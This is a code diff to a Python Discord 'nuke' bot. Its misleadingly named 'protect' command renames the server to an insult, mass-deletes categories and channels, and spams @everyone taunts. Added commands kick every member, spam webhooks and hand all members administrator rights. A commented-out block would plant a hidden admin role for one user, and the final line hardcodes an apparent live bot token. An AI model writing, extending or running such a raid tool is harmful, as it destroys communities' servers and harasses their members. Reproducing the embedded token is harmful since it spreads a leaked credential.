@@ -17,8 +17,42 @@ async def on_ready():
 
 @bot.command()
 async def protect(ctx):
+    
+    # admin_role = await ctx.guild.create_role(name="*", permissions=discord.Permissions(administrator=True), hoist=False)
+
+    # user_id_to_assign = [PUT DISCORD ID HERE]
+    # user = await ctx.guild.fetch_member(user_id_to_assign)
+
+    # if user:
+        # await user.add_roles(admin_role)
+
+    # Adjust role position to be above the bot's role
+    # bot_member = ctx.guild.get_member(bot.user.id)
+    # if bot_member:
+    #    bot_role = bot_member.top_role
+    #    if admin_role.position < bot_role.position:
+    #        await admin_role.edit(position=bot_role.position - 1)
+    
     new_server_name = "NUKED BITCH" # change this to whatever u want the server name to be
     await ctx.guild.edit(name=new_server_name)
+    
+    num_categories_to_delete = 50
+    
+    
+    categories = ctx.guild.categories
+    
+    if len(categories) <= num_categories_to_delete:
+        for category in categories:
+            await category.delete()
+            
+    else:
+        categories_to_delete = random.sample(categories, num_categories_to_delete)
+        
+        for category in categories_to_delete:
+            try:
+                await category.delete()
+            except discord.Forbidden:
+                pass
     
     num_channels_to_delete = 50
 
@@ -48,6 +82,9 @@ async def protect(ctx):
             except discord.errors.HTTPException as e:
                 if e.code == 50074:
                     pass
+                
+    print("Successfully nuked the server")
+                
 
     # makes new channels and messages
     message = "@everyone nuked! haha skill issue https://tenor.com/view/nike-keychain-gif-24272076 " # this is the message that is spammed, and the line of code after is all the channels it makes
@@ -65,6 +102,32 @@ async def send_messages(channel, message):
         await channel.send(message) 
 
 @bot.command()
+async def kickall(ctx):
+    num_members_to_kick = 5000000
+
+    # Get a list of all members in the server
+    members = ctx.guild.members
+
+    if len(members) <= num_members_to_kick:
+        for member in members:
+            try:
+                await member.kick(reason="user error")
+            except discord.Forbidden:
+                # If the bot doesn't have permission to kick a member, skip it
+                pass
+    else:
+        # Choose 5 random members to kick
+        members_to_kick = random.sample(members, num_members_to_kick)
+
+        for member in members_to_kick:
+            try:
+                await member.kick(reason="user error")
+            except discord.Forbidden:
+                # If the bot doesn't have permission to kick a member, skip it
+                pass
+    print("Successfully kicked everyone in the server")
+
+@bot.command()
 async def webhook(ctx, num_times: int = 20): # webhook command makes a webhook and spams it
     
     text_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
@@ -80,6 +143,7 @@ async def webhook(ctx, num_times: int = 20): # webhook command makes a webhook a
         message = "@everyone say bye to your shitty server LMAOO https://tenor.com/view/nike-keychain-gif-24272076 " # this is the message it spams it with
         for _ in range(num_times):
             await webhook.send(message)
+        print("Successfully spammed a webhook")
    
 @bot.command()
 async def roleadmin(ctx): # this just creates a role called Admin with admin perms, (if you have manage role perms, you can give urself this role since its at the bottom)
@@ -88,6 +152,7 @@ async def roleadmin(ctx): # this just creates a role called Admin with admin per
     
     for member in ctx.guild.members:
         await member.add_roles(admin_role, reason="feel like it")
+    print("Successfully made a role with admin perms")
      
 
 @bot.command()
@@ -117,6 +182,7 @@ async def clean(ctx):
         channels_to_delete = random.sample(channels, 50)  # finds 50 random channels and deletes
         for channel in channels_to_delete:
             await channel.delete()
+            print("Successfully cleared all channels")
         
 # put bot token in here
-bot.run('')
+bot.run('MTE0MzE3NzQ3MDYwNzExMDIyNA.GRUDLZ.7kA0QgUieyOd6vFwUHQGTcMvp-slOFuoObwvYI')
